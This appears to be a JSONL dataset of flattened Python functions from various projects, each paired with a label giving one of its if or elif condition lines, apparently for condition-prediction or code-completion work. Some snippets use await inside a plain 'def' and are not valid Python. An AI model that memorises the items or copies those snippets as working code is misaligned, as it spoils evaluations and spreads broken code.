{"input": "def close(self, checkcount=False): self.mutex.acquire() try: if checkcount: self.openers -= 1 if self.openers == 0: self.do_close() else: if self.openers > 0: self.do_close() self.openers = 0 finally: self.mutex.release()", "label": "if checkcount :"}
{"input": "def __get__(self, obj, type=None): if obj is None: return self with self.lock: value = obj.__dict__.get(self.__name__, self._default_value) if value is self._default_value: value = self.func(obj) obj.__dict__[self.__name__] = value return value", "label": "if value is self . _default_value :"}
{"input": "def _test_pooling_iteration(input_shape, **kwargs): \"\"\"One iteration of pool operation with given shapes and attributes\"\"\" x = -np.arange(np.prod(input_shape), dtype=np.float32).reshape(input_shape) - 1 with tf.Graph().as_default(): in_data = array_ops.placeholder(shape=input_shape, dtype=\"float32\") nn_ops.pool(in_data, **kwargs) if kwargs[\"pooling_type\"] == \"MAX\": out_name = \"max_pool:0\" else: out_name = \"avg_pool:0\" compare_tf_with_tvm(x, \"Placeholder:0\", out_name)", "label": "if kwargs [ \"pooling_type\" ] == \"MAX\" :"}
{"input": "def updateValue(self): if self._index: val = toInt(self._model.data(self._index)) if self.sld.value() != val: self._updating = True self.setValue(val) self._updating = False", "label": "if self . sld . value ( ) != val :"}
{"input": "def _count(self, element, count=True): if not isinstance(element, six.string_types): if self == element: return 1 i = 0 for child in self.children: # child is text content and element is also text content, then # make a simple \"text\" in \"text\" if isinstance(child, six.string_types): if isinstance(element, six.string_types): if count: i += child.count(element) elif element in child: return 1 else: i += child._count(element, count=count) if not count and i: return i return i", "label": "if self == element :"}
{"input": "def test_doctests(self): \"\"\"Run tutorial doctests.\"\"\" runner = doctest.DocTestRunner() failures = [] for test in doctest.DocTestFinder().find(TutorialDocTestHolder): failed, success = runner.run(test) if failed: name = test.name assert name.startswith(\"TutorialDocTestHolder.doctest_\") failures.append(name[30:]) # raise ValueError(\"Tutorial doctest %s failed\" % test.name[30:]) if failures: raise ValueError( \"%i Tutorial doctests failed: %s\" % (len(failures), \", \".join(failures)) )", "label": "if failed :"}
{"input": "def send_preamble(self): \"\"\"Transmit version/status/date/server, via self._write()\"\"\" if self.origin_server: if self.client_is_modern(): self._write(\"HTTP/%s %s\\r\\n\" % (self.http_version, self.status)) if not self.headers.has_key(\"Date\"): self._write(\"Date: %s\\r\\n\" % time.asctime(time.gmtime(time.time()))) if self.server_software and not self.headers.has_key(\"Server\"): self._write(\"Server: %s\\r\\n\" % self.server_software) else: self._write(\"Status: %s\\r\\n\" % self.status)", "label": "if not self . headers . has_key ( \"Date\" ) :"}
{"input": "def _verify_unique_measurement_keys(operations: Iterable[ops.Operation]): seen: Set[str] = set() for op in operations: if isinstance(op.gate, ops.MeasurementGate): meas = op.gate key = protocols.measurement_key(meas) if key in seen: raise ValueError(\"Measurement key {} repeated\".format(key)) seen.add(key)", "label": "if key in seen :"}
{"input": "def test_dtype_basics(df): df[\"new_virtual_column\"] = df.x + 1 for name in df.column_names: if df.dtype(name) == str_type: assert df[name].values.dtype.kind in \"OSU\" else: assert df[name].values.dtype == df.dtype(df[name])", "label": "if df . dtype ( name ) == str_type :"}
{"input": "def string_to_points(self, command, coord_string): numbers = string_to_numbers(coord_string) if command.upper() in [\"H\", \"V\"]: i = {\"H\": 0, \"V\": 1}[command.upper()] xy = np.zeros((len(numbers), 2)) xy[:, i] = numbers if command.isupper(): xy[:, 1 - i] = self.relative_point[1 - i] elif command.upper() == \"A\": raise Exception(\"Not implemented\") else: xy = np.array(numbers).reshape((len(numbers) // 2, 2)) result = np.zeros((xy.shape[0], self.dim)) result[:, :2] = xy return result", "label": "if command . isupper ( ) :"}
{"input": "def get_count(self, peek=False): if self.argument_supplied: count = self.argument_value if self.argument_negative: if count == 0: count = -1 else: count = -count if not peek: self.argument_negative = False if not peek: self.argument_supplied = False else: count = 1 return count", "label": "if not peek :"}
{"input": "def toggleSchedule(self, **kwargs): schedules = cfg.schedules() line = kwargs.get(\"line\") if line: for i, schedule in enumerate(schedules): if schedule == line: # Toggle the schedule schedule_split = schedule.split() schedule_split[0] = \"%d\" % (schedule_split[0] == \"0\") schedules[i] = \" \".join(schedule_split) break cfg.schedules.set(schedules) config.save_config() sabnzbd.Scheduler.restart() raise Raiser(self.__root)", "label": "if schedule == line :"}
{"input": "def test_sanity_no_long_entities(CorpusType: Type[ColumnCorpus]): corpus = CorpusType() longest_entity = [] for sentence in corpus.get_all_sentences(): entities = sentence.get_spans(\"ner\") for entity in entities: if len(entity.tokens) > len(longest_entity): longest_entity = [t.text for t in entity.tokens] assert len(longest_entity) < 10, \" \".join(longest_entity)", "label": "if len ( entity . tokens ) > len ( longest_entity ) :"}
{"input": "def _set_helper(settings, path, value, data_type=None): path = _to_settings_path(path) method = settings.set if data_type is not None: name = None if data_type == bool: name = \"setBoolean\" elif data_type == float: name = \"setFloat\" elif data_type == int: name = \"setInt\" if name is not None: method = getattr(settings, name) method(path, value) settings.save()", "label": "elif data_type == int :"}
{"input": "def scan_page(self, address_space, page_offset, fullpage=False): \"\"\"Runs through patchers for a single page\"\"\" if fullpage: pagedata = address_space.read(page_offset, PAGESIZE) for patcher in self.patchers: for offset, data in patcher.get_constraints(): if fullpage: testdata = pagedata[offset : offset + len(data)] else: testdata = address_space.read(page_offset + offset, len(data)) if data != testdata: break else: yield patcher", "label": "if data != testdata :"}
{"input": "def accessSlice(self, node): self.visit(node.value) node.obj = self.getObj(node.value) self.access = _access.INPUT lower, upper = node.slice.lower, node.slice.upper if lower: self.visit(lower) if upper: self.visit(upper) if isinstance(node.obj, intbv): if self.kind == _kind.DECLARATION: self.require(lower, \"Expected leftmost index\") leftind = self.getVal(lower) if upper: rightind = self.getVal(upper) else: rightind = 0 node.obj = node.obj[leftind:rightind]", "label": "if self . kind == _kind . DECLARATION :"}
{"input": "def childConnectionLost(self, childFD): if self.state == 1: self.fail(\"got connectionLost(%d) during state 1\" % childFD) return if self.state == 2: if childFD != 4: self.fail(\"got connectionLost(%d) (not 4) during state 2\" % childFD) return self.state = 3 self.transport.closeChildFD(5) return", "label": "if childFD != 4 :"}
{"input": "def _find_matches(self, file, lookup, **kwargs): matches = [] for format in lookup.values(): if format.sniffer_function is not None: is_format, skwargs = format.sniffer_function(file, **kwargs) file.seek(0) if is_format: matches.append((format.name, skwargs)) return matches", "label": "if format . sniffer_function is not None :"}
{"input": "def ParseCodeLines(tokens, case): \"\"\"Parse uncommented code in a test case.\"\"\" _, kind, item = tokens.peek() if kind != PLAIN_LINE: raise ParseError(\"Expected a line of code (got %r, %r)\" % (kind, item)) code_lines = [] while True: _, kind, item = tokens.peek() if kind != PLAIN_LINE: case[\"code\"] = \"\\n\".join(code_lines) + \"\\n\" return code_lines.append(item) tokens.next()", "label": "if kind != PLAIN_LINE :"}
{"input": "def _recursive_process(self): super(RecursiveObjectDownwardsVisitor, self)._recursive_process() while self._new_for_visit: func_ea, arg_idx = self._new_for_visit.pop() if helper.is_imported_ea(func_ea): continue cfunc = helper.decompile_function(func_ea) if cfunc: assert arg_idx < len(cfunc.get_lvars()), \"Wrong argument at func {}\".format( to_hex(func_ea) ) obj = VariableObject(cfunc.get_lvars()[arg_idx], arg_idx) self.prepare_new_scan(cfunc, arg_idx, obj) self._recursive_process()", "label": "if helper . is_imported_ea ( func_ea ) :"}
{"input": "def GetBoundingBoxMin(self): \"\"\"Get the minimum bounding box.\"\"\" x1, y1 = 10000, 10000 x2, y2 = -10000, -10000 for point in self._lineControlPoints: if point[0] < x1: x1 = point[0] if point[1] < y1: y1 = point[1] if point[0] > x2: x2 = point[0] if point[1] > y2: y2 = point[1] return x2 - x1, y2 - y1", "label": "if point [ 0 ] > x2 :"}
{"input": "def __init__( self, detail=None, headers=None, comment=None, body_template=None, location=None, add_slash=False, ): super(_HTTPMove, self).__init__( detail=detail, headers=headers, comment=comment, body_template=body_template ) if location is not None: self.location = location if add_slash: raise TypeError( \"You can only provide one of the arguments location \" \"and add_slash\" ) self.add_slash = add_slash", "label": "if add_slash :"}
{"input": "def __str__(self, prefix=\"\", printElemNumber=0): res = \"\" cnt = 0 for e in self.presence_response_: elm = \"\" if printElemNumber: elm = \"(%d)\" % cnt res += prefix + (\"presence_response%s <\\n\" % elm) res += e.__str__(prefix + \" \", printElemNumber) res += prefix + \">\\n\" cnt += 1 return res", "label": "if printElemNumber :"}
{"input": "def _find_first_match(self, request): match_failed_reasons = [] for i, match in enumerate(self._matches): match_result, reason = match.matches(request) if match_result: return match, match_failed_reasons else: match_failed_reasons.append(reason) return None, match_failed_reasons", "label": "if match_result :"}
{"input": "def index(self, req, volume_id): req_version = req.api_version_request metadata = super(Controller, self).index(req, volume_id) if req_version.matches(mv.ETAGS): data = jsonutils.dumps(metadata) if six.PY3: data = data.encode(\"utf-8\") resp = webob.Response() resp.headers[\"Etag\"] = hashlib.md5(data).hexdigest() resp.body = data return resp return metadata", "label": "if six . PY3 :"}
{"input": "def init(self): \"\"\"Called after document is loaded.\"\"\" # Create div to put dynamic CSS assets in self.asset_node = window.document.createElement(\"div\") self.asset_node.id = \"Flexx asset container\" window.document.body.appendChild(self.asset_node) if self.is_exported: if self.is_notebook: print(\"Flexx: I am in an exported notebook!\") else: print(\"Flexx: I am in an exported app!\") self.run_exported_app() else: print(\"Flexx: Initializing\") if not self.is_notebook: self._remove_querystring() self.init_logging()", "label": "if not self . is_notebook :"}
{"input": "def get_default_person(self): \"\"\"Return the default Person of the database.\"\"\" person_handle = self.get_default_handle() if person_handle: person = self.get_person_from_handle(person_handle) if person: return person elif (self.metadata) and (not self.readonly): # Start transaction with BSDDBTxn(self.env, self.metadata) as txn: txn.put(b\"default\", None) return None else: return None", "label": "elif ( self . metadata ) and ( not self . readonly ) :"}
{"input": "def reader(): async with read: await wait_all_tasks_blocked() total_received = 0 while True: # 5000 is chosen because it doesn't evenly divide 2**20 received = len(await read.receive_some(5000)) if not received: break total_received += received assert total_received == count * replicas", "label": "if not received :"}
{"input": "def array_module(a): if isinstance(a, np.ndarray): return np else: from pyopencl.array import Array if isinstance(a, Array): return _CLFakeArrayModule(a.queue) else: raise TypeError(\"array type not understood: %s\" % type(a))", "label": "if isinstance ( a , Array ) :"}
{"input": "def __str__(self): path = super(XPathExpr, self).__str__() if self.textnode: if path == \"*\": path = \"text()\" elif path.endswith(\"::*/*\"): path = path[:-3] + \"text()\" else: path += \"/text()\" if self.attribute is not None: if path.endswith(\"::*/*\"): path = path[:-2] path += \"/@%s\" % self.attribute return path", "label": "if path == \"*\" :"}
{"input": "def update(self): if self.saved(): rgns = self.view.get_regions(self.region_key) if rgns: rgn = Region.from_region(self.view, rgns[0], self.region_key) self.start = rgn.start self.end = rgn.end", "label": "if rgns :"}
{"input": "def PrintServerName(data, entries): if entries > 0: entrieslen = 26 * entries chunks, chunk_size = len(data[:entrieslen]), entrieslen / entries ServerName = [data[i : i + chunk_size] for i in range(0, chunks, chunk_size)] l = [] for x in ServerName: FP = WorkstationFingerPrint(x[16:18]) Name = x[:16].replace(\"\\x00\", \"\") if FP: l.append(Name + \" (%s)\" % FP) else: l.append(Name) return l return None", "label": "if FP :"}
{"input": "def add_lookup(self, name_type, pyname, jsname, depth=-1): jsname = self.jsname(name_type, jsname) if self.local_prefix is not None: if jsname.find(self.local_prefix) != 0: jsname = self.jsname(name_type, \"%s.%s\" % (self.local_prefix, jsname)) if self.lookup_stack[depth].has_key(pyname): name_type = self.lookup_stack[depth][pyname][0] if self.module_name != \"pyjslib\" or pyname != \"int\": self.lookup_stack[depth][pyname] = (name_type, pyname, jsname) return jsname", "label": "if jsname . find ( self . local_prefix ) != 0 :"}
{"input": "def ensure_echo_on(): if termios: fd = sys.stdin if fd.isatty(): attr_list = termios.tcgetattr(fd) if not attr_list[3] & termios.ECHO: attr_list[3] |= termios.ECHO if hasattr(signal, \"SIGTTOU\"): old_handler = signal.signal(signal.SIGTTOU, signal.SIG_IGN) else: old_handler = None termios.tcsetattr(fd, termios.TCSANOW, attr_list) if old_handler is not None: signal.signal(signal.SIGTTOU, old_handler)", "label": "if fd . isatty ( ) :"}
{"input": "def get_query_results(user, query_id, bring_from_cache): query = _load_query(user, query_id) if bring_from_cache: if query.latest_query_data_id is not None: results = query.latest_query_data.data else: raise Exception(\"No cached result available for query {}.\".format(query.id)) else: results, error = query.data_source.query_runner.run_query( query.query_text, user ) if error: raise Exception(\"Failed loading results for query id {}.\".format(query.id)) else: results = json_loads(results) return results", "label": "if query . latest_query_data_id is not None :"}
{"input": "def on_tag_added_to_page(self, o, row, pagerow): self.flush_cache() if row[\"name\"] in self.tags and self._matches_all(pagerow[\"id\"]): # Without the new tag it did not match, so add to view # Find top level entry - ignore possible deeper matches for treepath in self._find_all_pages(pagerow[\"name\"]): if len(treepath) == 1: treeiter = self.get_iter(treepath) # not mytreeiter ! self.emit(\"row-inserted\", treepath, treeiter) if pagerow[\"n_children\"] > 0: self._emit_children_inserted(pagerow[\"id\"], treepath)", "label": "if pagerow [ \"n_children\" ] > 0 :"}
{"input": "def _is_subnet_of(a, b): try: # Always false if one is v4 and the other is v6. if a._version != b._version: raise TypeError(f\"{a} and {b} are not of the same version\") return ( b.network_address <= a.network_address and b.broadcast_address >= a.broadcast_address ) except AttributeError: raise TypeError(f\"Unable to test subnet containment \" f\"between {a} and {b}\")", "label": "if a . _version != b . _version :"}
{"input": "def consume(d={}): \"\"\"Add attribute list to the dictionary 'd' and reset the list.\"\"\" if AttributeList.attrs: d.update(AttributeList.attrs) AttributeList.attrs = {} # Generate option attributes. if \"options\" in d: options = parse_options(d[\"options\"], (), \"illegal option name\") for option in options: d[option + \"-option\"] = \"\"", "label": "if \"options\" in d :"}
{"input": "def tearDown(self): # make sure all of the subprocesses are dead for pidfile in self.pidfiles: if not os.path.exists(pidfile): continue with open(pidfile) as f: pid = f.read() if not pid: return pid = int(pid) try: os.kill(pid, signal.SIGKILL) except OSError: pass # and clean up leftover pidfiles for pidfile in self.pidfiles: if os.path.exists(pidfile): os.unlink(pidfile) self.tearDownBasedir()", "label": "if os . path . exists ( pidfile ) :"}
{"input": "def sort(self, items): slow_sorts = [] switch_slow = False for sort in reversed(self.sorts): if switch_slow: slow_sorts.append(sort) elif sort.order_clause() is None: switch_slow = True slow_sorts.append(sort) else: pass for sort in slow_sorts: items = sort.sort(items) return items", "label": "elif sort . order_clause ( ) is None :"}
{"input": "def shortcut(input, ch_out, stride): ch_in = input.shape[1] if ch_in != ch_out: if stride == 1: filter_size = 1 else: filter_size = 3 return conv_bn_layer(input, ch_out, filter_size, stride) else: return input", "label": "if stride == 1 :"}
{"input": "def detab(self, text): \"\"\"Remove a tab from the front of each line of the given text.\"\"\" newtext = [] lines = text.split(\"\\n\") for line in lines: if line.startswith(\" \" * self.tab_length): newtext.append(line[self.tab_length :]) elif not line.strip(): newtext.append(\"\") else: break return \"\\n\".join(newtext), \"\\n\".join(lines[len(newtext) :])", "label": "elif not line . strip ( ) :"}
{"input": "def construct_instances(self, row, keys=None): collected_models = {} for i, (key, constructor, attr, conv) in enumerate(self.column_map): if keys is not None and key not in keys: continue value = row[i] if key not in collected_models: collected_models[key] = constructor() instance = collected_models[key] if attr is None: attr = self.cursor.description[i][0] if conv is not None: value = conv(value) setattr(instance, attr, value) return collected_models", "label": "if attr is None :"}
{"input": "def stop_loggers(self): super(NetconsoleHost, self).stop_loggers() if self.__logger: utils.nuke_subprocess(self.__logger) self.__logger = None if self.job: self.job.warning_loggers.discard(self.__warning_stream) self.__warning_stream.close()", "label": "if self . job :"}
{"input": "def get_template_context(node, context, context_lines=3): line, source_lines, name = get_template_source_from_exception_info(node, context) debug_context = [] start = max(1, line - context_lines) end = line + 1 + context_lines for line_num, content in source_lines: if start <= line_num <= end: debug_context.append( {\"num\": line_num, \"content\": content, \"highlight\": (line_num == line)} ) return {\"name\": name, \"context\": debug_context}", "label": "if start <= line_num <= end :"}
{"input": "def arg_names(self, lineage, command_name, positional_arg=False): parent = \".\".join(lineage) arg_names = self.index[\"arg_names\"].get(parent, {}).get(command_name, []) filtered_arg_names = [] for arg_name in arg_names: arg_data = self.get_argument_data(lineage, command_name, arg_name) if arg_data.positional_arg == positional_arg: filtered_arg_names.append(arg_name) return filtered_arg_names", "label": "if arg_data . positional_arg == positional_arg :"}
{"input": "def attributive(adjective, gender=MALE): w = adjective.lower() # normal => normales if PLURAL in gender and not is_vowel(w[-1:]): return w + \"es\" # el chico inteligente => los chicos inteligentes if PLURAL in gender and w.endswith((\"a\", \"e\")): return w + \"s\" # el chico alto => los chicos altos if w.endswith(\"o\"): if FEMININE in gender and PLURAL in gender: return w[:-1] + \"as\" if FEMININE in gender: return w[:-1] + \"a\" if PLURAL in gender: return w + \"s\" return w", "label": "if FEMININE in gender and PLURAL in gender :"}
{"input": "def _get_disk_size(cls, path, ignored=None): if ignored is None: ignored = [] if path in ignored: return 0 total = 0 for entry in scandir(path): if entry.is_dir(): total += cls._get_disk_size(entry.path, ignored=ignored) elif entry.is_file(): total += entry.stat().st_size return total", "label": "elif entry . is_file ( ) :"}
{"input": "def validateHeaders(self): if \"Cookie\" in self.headers: for session in self.factory.authenticated_sessions: if \"TWISTED_SESSION=\" + session.uid in self.headers[\"Cookie\"]: return WebSocketProtocol.validateHeaders(self) return False", "label": "if \"TWISTED_SESSION=\" + session . uid in self . headers [ \"Cookie\" ] :"}
{"input": "def _format_privilege_data(self, data): for key in [\"spcacl\"]: if key in data and data[key] is not None: if \"added\" in data[key]: data[key][\"added\"] = parse_priv_to_db(data[key][\"added\"], self.acl) if \"changed\" in data[key]: data[key][\"changed\"] = parse_priv_to_db(data[key][\"changed\"], self.acl) if \"deleted\" in data[key]: data[key][\"deleted\"] = parse_priv_to_db(data[key][\"deleted\"], self.acl)", "label": "if \"added\" in data [ key ] :"}
{"input": "def show_text(text): print(_stash.text_color(\"=\" * 20, \"yellow\")) lines = text.split(\"\\n\") while True: if len(lines) < 100: print(\"\\n\".join(lines)) return else: print(\"\\n\".join(lines[:100])) lines = lines[100:] prompt = _stash.text_color(\"(Press Return to continue)\", \"yellow\") raw_input(prompt) print(\"\\n\")", "label": "if len ( lines ) < 100 :"}
{"input": "def run(self): TimeInspector.set_time_mark() for tuner_index, tuner_config in enumerate(self.pipeline_config): tuner = self.init_tuner(tuner_index, tuner_config) tuner.tune() if self.global_best_res is None or self.global_best_res > tuner.best_res: self.global_best_res = tuner.best_res self.global_best_params = tuner.best_params self.best_tuner_index = tuner_index TimeInspector.log_cost_time(\"Finished tuner pipeline.\") self.save_tuner_exp_info()", "label": "if self . global_best_res is None or self . global_best_res > tuner . best_res :"}
{"input": "def OnEvent(self, propGrid, aProperty, ctrl, event): if event.GetEventType() == wx.wxEVT_BUTTON: buttons = propGrid.GetEditorControlSecondary() if event.GetId() == buttons.GetButtonId(0): # Do something when the first button is pressed # Return true if the action modified the value in editor. ... if event.GetId() == buttons.GetButtonId(1): # Do something when the second button is pressed ... if event.GetId() == buttons.GetButtonId(2): # Do something when the third button is pressed ... return wx.propgrid.PGTextCtrlEditor.OnEvent(propGrid, aProperty, ctrl, event)", "label": "if event . GetId ( ) == buttons . GetButtonId ( 1 ) :"}
{"input": "def run(self, edit): view = self.view for sel in view.sel(): if not self.is_valid_scope(sel): continue region = view.extract_scope(sel.end()) content = self.extract_content(region) resolver, content = self.resolve(content) if content is None: sublime.error_message(\"Could not resolve link:\\n%s\" % content) continue resolver.execute(content)", "label": "if content is None :"}
{"input": "def __init__(self, aList): for element in aList: if len(element) > 0: if element.tag == element[0].tag: self.append(ListParser(element)) else: self.append(DictParser(element)) elif element.text: text = element.text.strip() if text: self.append(text)", "label": "elif element . text :"}
{"input": "def put(self, can_split=False): for node in (self.nodes)[:1]: if self.has_value(node): node.put(can_split=can_split) for node in (self.nodes)[1:]: self.line_more(SLICE_COLON, can_split_after=True) if self.has_value(node): node.put(can_split=can_split) return self", "label": "if self . has_value ( node ) :"}
{"input": "def process_return_exits(self, exits): \"\"\"Add arcs due to jumps from `exits` being returns.\"\"\" for block in self.nearest_blocks(): if isinstance(block, TryBlock) and block.final_start is not None: block.return_from.update(exits) break elif isinstance(block, FunctionBlock): for xit in exits: self.add_arc( xit.lineno, -block.start, xit.cause, \"didn't return from function {!r}\".format(block.name), ) break", "label": "elif isinstance ( block , FunctionBlock ) :"}
{"input": "def find_commands(management_dir): # Modified version of function from django/core/management/__init__.py. command_dir = os.path.join(management_dir, \"commands\") commands = [] try: for f in os.listdir(command_dir): if f.startswith(\"_\"): continue elif f.endswith(\".py\") and f[:-3] not in commands: commands.append(f[:-3]) elif f.endswith(\".pyc\") and f[:-4] not in commands: commands.append(f[:-4]) except OSError: pass return commands", "label": "elif f . endswith ( \".py\" ) and f [ : - 3 ] not in commands :"}
{"input": "def split_path_info(path): # suitable for splitting an already-unquoted-already-decoded (unicode) # path value path = path.strip(\"/\") clean = [] for segment in path.split(\"/\"): if not segment or segment == \".\": continue elif segment == \"..\": if clean: del clean[-1] else: clean.append(segment) return tuple(clean)", "label": "if not segment or segment == \".\" :"}
{"input": "def __init__(self, source_definition, **kw): super(RekallEFilterArtifacts, self).__init__(source_definition, **kw) for column in self.fields: if \"name\" not in column or \"type\" not in column: raise errors.FormatError( u\"Field definition should have both name and type.\" ) mapped_type = column[\"type\"] if mapped_type not in self.allowed_types: raise errors.FormatError(u\"Unsupported type %s.\" % mapped_type)", "label": "if \"name\" not in column or \"type\" not in column :"}
{"input": "def _name(self, sender, short=True, full_email=False): words = re.sub('[\"<>]', \"\", sender).split() nomail = [w for w in words if not \"@\" in w] if nomail: if short: if len(nomail) > 1 and nomail[0].lower() in self._NAME_TITLES: return nomail[1] return nomail[0] return \" \".join(nomail) elif words: if not full_email: return words[0].split(\"@\", 1)[0] return words[0] return \"(nobody)\"", "label": "if len ( nomail ) > 1 and nomail [ 0 ] . lower ( ) in self . _NAME_TITLES :"}
{"input": "def _get_consuming_layers(self, check_layer): \"\"\"Returns all the layers which are out nodes from the layer.\"\"\" consuming_layers = [] for layer in self._config[\"layers\"]: for inbound_node in layer[\"inbound_nodes\"]: for connection_info in inbound_node: if connection_info[0] == check_layer[\"config\"][\"name\"]: consuming_layers.append(layer) return consuming_layers", "label": "if connection_info [ 0 ] == check_layer [ \"config\" ] [ \"name\" ] :"}
{"input": "def _check_feasible_fuse(self, model): if not self.modules_to_fuse: return False for group in self.modules_to_fuse: if not all(_recursive_hasattr(model, m) for m in group): raise MisconfigurationException( f\"You have requested to fuse {group} but one or more of them is not your model attributes\" ) return True", "label": "if not all ( _recursive_hasattr ( model , m ) for m in group ) :"}
{"input": "def cancel_loan_repayment_entry(self): for loan in self.loans: if loan.loan_repayment_entry: repayment_entry = frappe.get_doc( \"Loan Repayment\", loan.loan_repayment_entry ) repayment_entry.cancel()", "label": "if loan . loan_repayment_entry :"}
{"input": "def update_channel_entries(self, request): try: request_parsed = await request.json() except (ContentTypeError, ValueError): return RESTResponse({\"error\": \"Bad JSON\"}, status=HTTP_BAD_REQUEST) results_list = [] for entry in request_parsed: public_key = database_blob(unhexlify(entry.pop(\"public_key\"))) id_ = entry.pop(\"id\") error, result = self.update_entry(public_key, id_, entry) # TODO: handle the results for a list that contains some errors in a smarter way if error: return RESTResponse(result, status=error) results_list.append(result) return RESTResponse(results_list)", "label": "if error :"}
{"input": "def delete(self, userId: str, bucket: str, key: str) -> bool: if not self.initialized: raise Exception(\"archive not initialized\") try: with db.session_scope() as dbsession: rc = db_archivedocument.delete(userId, bucket, key, session=dbsession) if not rc: raise Exception(\"failed to delete DB record\") else: return True except Exception as err: raise err", "label": "if not rc :"}
{"input": "def handle_phase(task, config): \"\"\"Function that runs all of the configured plugins which act on the current phase.\"\"\" # Keep a list of all results, for input plugin combining results = [] for item in config: for plugin_name, plugin_config in item.items(): if phase in plugin.get_phases_by_plugin(plugin_name): method = plugin.get_plugin_by_name(plugin_name).phase_handlers[phase] log.debug(\"Running plugin %s\" % plugin_name) result = method(task, plugin_config) if phase == \"input\" and result: results.append(result) return itertools.chain(*results)", "label": "if phase == \"input\" and result :"}
{"input": "def guess_gitlab_remote(self): upstream = self.get_upstream_for_active_branch() integrated_remote = self.get_integrated_remote_name() remotes = self.get_remotes() if len(self.remotes) == 1: return list(remotes.keys())[0] elif upstream: tracked_remote = upstream.split(\"/\")[0] if upstream else None if tracked_remote and tracked_remote == integrated_remote: return tracked_remote else: return None else: return integrated_remote", "label": "if tracked_remote and tracked_remote == integrated_remote :"}
{"input": "def do_test(self, path): reader = paddle.reader.creator.recordio(path) idx = 0 for e in reader(): if idx == 0: self.assertEqual(e, (1, 2, 3)) elif idx == 1: self.assertEqual(e, (4, 5, 6)) idx += 1 self.assertEqual(idx, 2)", "label": "elif idx == 1 :"}
{"input": "def gen_cpu_name(cpu): if cpu == \"simple\": return event_download.get_cpustr() for j in known_cpus: if cpu == j[0]: if isinstance(j[1][0], tuple): return \"GenuineIntel-6-%02X-%d\" % j[1][0] else: return \"GenuineIntel-6-%02X\" % j[1][0] assert False", "label": "if isinstance ( j [ 1 ] [ 0 ] , tuple ) :"}
{"input": "def read_kernel_cmdline_config(cmdline=None): if cmdline is None: cmdline = util.get_cmdline() if \"network-config=\" in cmdline: data64 = None for tok in cmdline.split(): if tok.startswith(\"network-config=\"): data64 = tok.split(\"=\", 1)[1] if data64: if data64 == KERNEL_CMDLINE_NETWORK_CONFIG_DISABLED: return {\"config\": \"disabled\"} return util.load_yaml(_b64dgz(data64)) return None", "label": "if data64 :"}
{"input": "def _verify_bot(self, ctx: \"Context\") -> None: if ctx.guild is None: bot_user = ctx.bot.user else: bot_user = ctx.guild.me cog = ctx.cog if cog and await ctx.bot.cog_disabled_in_guild(cog, ctx.guild): raise discord.ext.commands.DisabledCommand() bot_perms = ctx.channel.permissions_for(bot_user) if not (bot_perms.administrator or bot_perms >= self.bot_perms): raise BotMissingPermissions( missing=self._missing_perms(self.bot_perms, bot_perms) )", "label": "if cog and await ctx . bot . cog_disabled_in_guild ( cog , ctx . guild ) :"}
{"input": "def _split_values(self, value): # do the regex mojo here if not self.allowed_values: return (\"\",) try: r = re.compile(self.allowed_values) except: print(self.allowed_values, file=sys.stderr) raise s = str(value) i = 0 vals = [] while True: m = r.search(s[i:]) if m is None: break vals.append(m.group()) delimiter = s[i : i + m.start()] if self.delimiter is None and delimiter != \"\": self.delimiter = delimiter i += m.end() return tuple(vals)", "label": "if m is None :"}
{"input": "def _count(self, element, count=True): if not isinstance(element, six.string_types): if self == element: return 1 i = 0 for child in self.children: # child is text content and element is also text content, then # make a simple \"text\" in \"text\" if isinstance(child, six.string_types): if isinstance(element, six.string_types): if count: i += child.count(element) elif element in child: return 1 else: i += child._count(element, count=count) if not count and i: return i return i", "label": "if not count and i :"}
{"input": "def set_page(self, page): \"\"\"If a page is present as a bookmark than select it.\"\"\" pagename = page.name with self.on_bookmark_clicked.blocked(): for button in self.scrolledbox.get_scrolled_children(): if button.zim_path == pagename: button.set_active(True) else: button.set_active(False)", "label": "if button . zim_path == pagename :"}
{"input": "def get_Subclass_of(rt): for y in [getattr(Ast, x) for x in dir(Ast)]: yt = clr.GetClrType(y) if rt == yt: continue if yt.IsAbstract: continue if yt.IsSubclassOf(rt): yield yt.Name", "label": "if rt == yt :"}
{"input": "def update_parent_columns(self): \"Update the parent columns of the current focus column.\" f = self.columns.get_focus_column() col = self.col_list[f] while 1: parent, pcol = self.get_parent(col) if pcol is None: return changed = pcol.update_results(start_from=parent) if not changed: return col = pcol", "label": "if not changed :"}
{"input": "def get_template_engine(themes): \"\"\"Get template engine used by a given theme.\"\"\" for theme_name in themes: engine_path = os.path.join(theme_name, \"engine\") if os.path.isfile(engine_path): with open(engine_path) as fd: return fd.readlines()[0].strip() # default return \"mako\"", "label": "if os . path . isfile ( engine_path ) :"}
{"input": "def reConnect(self): while self.retrymax is None or self.retries < self.retrymax: logger.info(\"Cobra reconnection attempt\") try: self.conn = self.httpfact() if self._cobra_sessid: self.authUser(self.authinfo) self.retries = 0 return except Exception as e: time.sleep(2 ** self.retries) self.retries += 1 self.trashed = True raise CobraHttpException(\"Retry Exceeded!\")", "label": "if self . _cobra_sessid :"}
{"input": "def __eq__(self, other): if isinstance(other, OrderedDict): if len(self) != len(other): return False for p, q in zip(list(self.items()), list(other.items())): if p != q: return False return True return dict.__eq__(self, other)", "label": "if p != q :"}
{"input": "def __getExpectedSampleOffsets(self, tileOrigin, area1, area2): ts = GafferImage.ImagePlug.tileSize() data = [] for y in range(tileOrigin.y, tileOrigin.y + ts): for x in range(tileOrigin.x, tileOrigin.x + ts): pixel = imath.V2i(x, y) data.append(data[-1] if data else 0) if GafferImage.BufferAlgo.contains(area1, pixel): data[-1] += 1 if GafferImage.BufferAlgo.contains(area2, pixel): data[-1] += 1 return IECore.IntVectorData(data)", "label": "if GafferImage . BufferAlgo . contains ( area1 , pixel ) :"}
{"input": "def _get_changes(self): \"\"\"Get changes from CHANGES.txt.\"\"\" log_lines = [] found_version = False found_items = False with open(\"CHANGES.txt\", \"r\") as fp: for line in fp.readlines(): line = line.rstrip() if line.endswith(VERSION_TEXT_SHORT): found_version = True if not line.strip() and found_items: break elif found_version and line.startswith(\"- \"): log_lines.append(\" \" * 2 + \"* \" + line[2:]) found_items = True return log_lines", "label": "elif found_version and line . startswith ( \"- \" ) :"}
{"input": "def _next_hid(self, n=1): # this is overriden in mapping.py db_next_hid() method if len(self.datasets) == 0: return n else: last_hid = 0 for dataset in self.datasets: if dataset.hid > last_hid: last_hid = dataset.hid return last_hid + n", "label": "if dataset . hid > last_hid :"}
